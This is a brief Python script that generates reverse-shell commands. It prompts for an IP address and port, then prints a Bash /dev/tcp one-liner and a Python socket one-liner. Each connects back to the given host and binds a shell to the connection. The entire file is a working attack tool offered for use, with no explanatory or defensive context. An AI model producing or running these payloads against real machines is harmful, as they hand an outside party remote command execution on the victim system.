ip = input("Enter your IP: ")
port = input("Enter port: ")

print("\\n[+] Bash:")
print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")

print("\\n[+] Python:")
print(f"python -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"{ip}\",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\"])'")